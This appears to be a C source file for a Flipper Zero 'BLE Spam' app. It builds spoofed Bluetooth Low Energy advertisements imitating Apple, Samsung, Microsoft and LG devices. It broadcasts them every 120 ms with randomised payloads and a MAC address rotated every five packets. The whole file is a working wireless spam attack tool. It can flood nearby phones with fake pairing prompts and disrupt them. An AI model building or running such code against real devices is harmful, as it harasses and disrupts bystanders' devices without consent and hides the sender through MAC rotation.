#include "../zx_ble_spam.h"
#include "scenes.h"
#include <furi.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <extra_beacon.h>
#include <furi_hal_bt.h>

#define TAG "BleSpam"
#define BLE_SPAM_TEMPLATES 10
#define BLE_SPAM_INTERVAL_MS 120
#define BLE_SPAM_MAC_CHANGE_INTERVAL 5

static const char* device_names[] = {
    "iPhone 15", "AirPods Pro", "AirTag", "Samsung S24", "SmartTag2",
    "Tile Pro", "Pixel 9", "iBeacon", "Surface Pro", "LG TV",
};

static uint8_t template_data[BLE_SPAM_TEMPLATES][31];
static uint8_t template_lens[BLE_SPAM_TEMPLATES];
static uint8_t template_random_start[BLE_SPAM_TEMPLATES];
static bool templates_ready = false;
static FuriTimer* spam_timer = NULL;
static uint32_t spam_counter = 0;

static void random_mac(uint8_t* mac) {
    mac[0] = (rand() & 0xFC) | 0x02;
    for(int i = 1; i < 6; i++) mac[i] = rand() & 0xFF;
}

static void init_templates(void) {
    if(templates_ready) return;
    for(int t = 0; t < BLE_SPAM_TEMPLATES; t++) {
        uint8_t* d = template_data[t];
        uint8_t i = 0;
        d[i++] = 2; d[i++] = 1; d[i++] = 0x06;
        switch(t) {
        case 0:
            d[i++] = 15; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x0A; d[i++] = 0x00;
            for(int j = 0; j < 10; j++) d[i++] = rand() & 0xFF;
            break;
        case 1:
            d[i++] = 12; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x07; d[i++] = 0x00;
            for(int j = 0; j < 7; j++) d[i++] = rand() & 0xFF;
            break;
        case 2:
            d[i++] = 20; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x12; d[i++] = 0x00;
            for(int j = 0; j < 15; j++) d[i++] = rand() & 0xFF;
            break;
        case 3:
            d[i++] = 19; d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00;
            d[i++] = 0x01; d[i++] = 0x00;
            for(int j = 0; j < 14; j++) d[i++] = rand() & 0xFF;
            break;
        case 4:
            d[i++] = 16; d[i++] = 0xFF; d[i++] = 0x75; d[i++] = 0x00;
            d[i++] = 0x03; d[i++] = 0x00;
            for(int j = 0; j < 11; j++) d[i++] = rand() & 0xFF;
            break;
        case 5:
            d[i++] = 14; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x05; d[i++] = 0x00;
            for(int j = 0; j < 9; j++) d[i++] = rand() & 0xFF;
            break;
        case 6:
            d[i++] = 17; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x0F; d[i++] = 0x00;
            for(int j = 0; j < 12; j++) d[i++] = rand() & 0xFF;
            break;
        case 7:
            d[i++] = 20; d[i++] = 0xFF; d[i++] = 0x4C; d[i++] = 0x00;
            d[i++] = 0x02; d[i++] = 0x15;
            for(int j = 0; j < 15; j++) d[i++] = rand() & 0xFF;
            break;
        case 8:
            d[i++] = 10; d[i++] = 0xFF; d[i++] = 0x06; d[i++] = 0x00;
            d[i++] = 0x01; d[i++] = 0x00;
            for(int j = 0; j < 5; j++) d[i++] = rand() & 0xFF;
            break;
        case 9:
            d[i++] = 6; d[i++] = 0x09;
            d[i++] = 'L'; d[i++] = 'G'; d[i++] = ' '; d[i++] = 'T'; d[i++] = 'V';
            break;
        }
        template_lens[t] = i;
        template_random_start[t] = 9;
    }
    template_random_start[9] = 7;
    templates_ready = true;
}

static void button_callback(GuiButtonType type, InputType input_type, void* context) {
    UNUSED(type);
    UNUSED(input_type);
    App* app = context;
    view_dispatcher_send_custom_event(app->view_dispatcher, BLEEventToggleScan);
}

static void update_widget(App* app) {
    widget_reset(app->widget);
    char buf[64];

    widget_add_string_element(app->widget, 64, 5, AlignCenter, AlignCenter, FontPrimary,
        app->ble_spam_active ? "BLE Spam [ACTIVE]" : "BLE Spam");

    if(app->ble_spam_active) {
        snprintf(buf, sizeof(buf), "Packets: %lu", app->ble_spam_packets);
        widget_add_string_element(app->widget, 64, 16, AlignCenter, AlignCenter, FontSecondary, buf);

        uint8_t idx = app->ble_spam_type % 10;
        snprintf(buf, sizeof(buf), "Device: %s", device_names[idx]);
        widget_add_string_element(app->widget, 64, 26, AlignCenter, AlignCenter, FontSecondary, buf);

        snprintf(buf, sizeof(buf), "MAC: %02X:%02X:%02X:%02X:%02X:%02X",
            app->ble_spam_mac[0], app->ble_spam_mac[1], app->ble_spam_mac[2],
            app->ble_spam_mac[3], app->ble_spam_mac[4], app->ble_spam_mac[5]);
        widget_add_string_element(app->widget, 64, 36, AlignCenter, AlignCenter, FontKeyboard, buf);

        snprintf(buf, sizeof(buf), "Beacon: %s", furi_hal_bt_extra_beacon_is_active() ? "OK" : "OFF");
        widget_add_string_element(app->widget, 64, 46, AlignCenter, AlignCenter, FontSecondary, buf);

        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Stop", button_callback, app);
    } else {
        uint8_t active = furi_hal_bt_extra_beacon_is_active();
        snprintf(buf, sizeof(buf), "Active: %s  Radio: %s", 
            active ? "Y" : "N",
            furi_hal_bt_is_alive() ? "OK" : "OFF");
        widget_add_string_element(app->widget, 64, 20, AlignCenter, AlignCenter, FontSecondary, buf);
        widget_add_string_element(app->widget, 64, 34, AlignCenter, AlignCenter, FontSecondary,
            "Press OK to start");
        widget_add_string_element(app->widget, 64, 44, AlignCenter, AlignCenter, FontSecondary,
            "Spams BLE devices");
        widget_add_string_element(app->widget, 64, 54, AlignCenter, AlignCenter, FontSecondary,
            "via built-in radio");
        widget_add_button_element(app->widget, GuiButtonTypeCenter, "Start", button_callback, app);
    }
}

static void spam_timer_callback(void* context) {
    App* app = context;
    if(!app || !app->ble_spam_active) return;

    spam_counter++;
    uint8_t idx = spam_counter % BLE_SPAM_TEMPLATES;

    if(spam_counter % BLE_SPAM_MAC_CHANGE_INTERVAL == 0) {
        uint8_t new_mac[6];
        random_mac(new_mac);
        memcpy(app->ble_spam_mac, new_mac, 6);

        GapExtraBeaconConfig config = {
            .min_adv_interval_ms = 50,
            .max_adv_interval_ms = 150,
            .adv_channel_map = GapAdvChannelMapAll,
            .adv_power_level = GapAdvPowerLevel_0dBm,
            .address_type = GapAddressTypeRandom,
        };
        memcpy(config.address, new_mac, 6);

        uint8_t rs = template_random_start[idx];
        for(uint8_t j = rs; j < template_lens[idx]; j++) template_data[idx][j] = rand() & 0xFF;
        FURI_LOG_I(TAG, "MAC change: idx=%d, len=%d", idx, template_lens[idx]);
        bool r;
        r = furi_hal_bt_extra_beacon_stop();  FURI_LOG_I(TAG, "  stop=%d", r);
        r = furi_hal_bt_extra_beacon_set_config(&config);  FURI_LOG_I(TAG, "  cfg=%d", r);
        r = furi_hal_bt_extra_beacon_set_data(template_data[idx], template_lens[idx]);  FURI_LOG_I(TAG, "  data=%d", r);
        r = furi_hal_bt_extra_beacon_start();  FURI_LOG_I(TAG, "  start=%d", r);
    } else {
        uint8_t* d = template_data[idx];
        uint8_t rs = template_random_start[idx];
        for(uint8_t j = rs; j < template_lens[idx]; j++) d[j] = rand() & 0xFF;
        furi_hal_bt_extra_beacon_set_data(template_data[idx], template_lens[idx]);
    }

    app->ble_spam_type = idx;
    app->ble_spam_packets++;
    update_widget(app);
}

void zx_ble_spam_scene_ble_spam_on_enter(void* context) {
    App* app = context;
    init_templates();
    app->ble_spam_active = false;
    app->ble_spam_packets = 0;
    app->ble_spam_type = 0;
    random_mac(app->ble_spam_mac);
    update_widget(app);
    view_dispatcher_switch_to_view(app->view_dispatcher, AppViewWidget);
}

bool zx_ble_spam_scene_ble_spam_on_event(void* context, SceneManagerEvent event) {
    App* app = context;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == BLEEventToggleScan) {
            if(app->ble_spam_active) {
                app->ble_spam_active = false;
                if(spam_timer) {
                    furi_timer_stop(spam_timer);
                    furi_timer_free(spam_timer);
                    spam_timer = NULL;
                }
                furi_hal_bt_extra_beacon_stop();
            } else {
                spam_counter = 0;
                app->ble_spam_active = true;
                app->ble_spam_packets = 0;
                random_mac(app->ble_spam_mac);

                GapExtraBeaconConfig config = {
                    .min_adv_interval_ms = 50,
                    .max_adv_interval_ms = 150,
                    .adv_channel_map = GapAdvChannelMapAll,
                    .adv_power_level = GapAdvPowerLevel_0dBm,
                    .address_type = GapAddressTypeRandom,
                };
                memcpy(config.address, app->ble_spam_mac, 6);

                FURI_LOG_I(TAG, "Starting BLE Spam, MAC: %02X:%02X:%02X:%02X:%02X:%02X",
                    app->ble_spam_mac[0], app->ble_spam_mac[1], app->ble_spam_mac[2],
                    app->ble_spam_mac[3], app->ble_spam_mac[4], app->ble_spam_mac[5]);

                bool r;
                r = furi_hal_bt_extra_beacon_stop();
                FURI_LOG_I(TAG, "stop: %d", r);
                r = furi_hal_bt_extra_beacon_set_config(&config);
                FURI_LOG_I(TAG, "set_config: %d", r);
                r = furi_hal_bt_extra_beacon_set_data(template_data[0], template_lens[0]);
                FURI_LOG_I(TAG, "set_data(len=%d): %d", template_lens[0], r);
                r = furi_hal_bt_extra_beacon_start();
                FURI_LOG_I(TAG, "start: %d", r);
                FURI_LOG_I(TAG, "is_active=%d", furi_hal_bt_extra_beacon_is_active());

                spam_timer = furi_timer_alloc(spam_timer_callback, FuriTimerTypePeriodic, app);
                furi_timer_start(spam_timer, BLE_SPAM_INTERVAL_MS);
            }
            update_widget(app);
            return true;
        }
    }

    return false;
}

void zx_ble_spam_scene_ble_spam_on_exit(void* context) {
    App* app = context;
    app->ble_spam_active = false;
    if(spam_timer) {
        furi_timer_stop(spam_timer);
        furi_timer_free(spam_timer);
        spam_timer = NULL;
    }
    furi_hal_bt_extra_beacon_stop();
    widget_reset(app->widget);
}
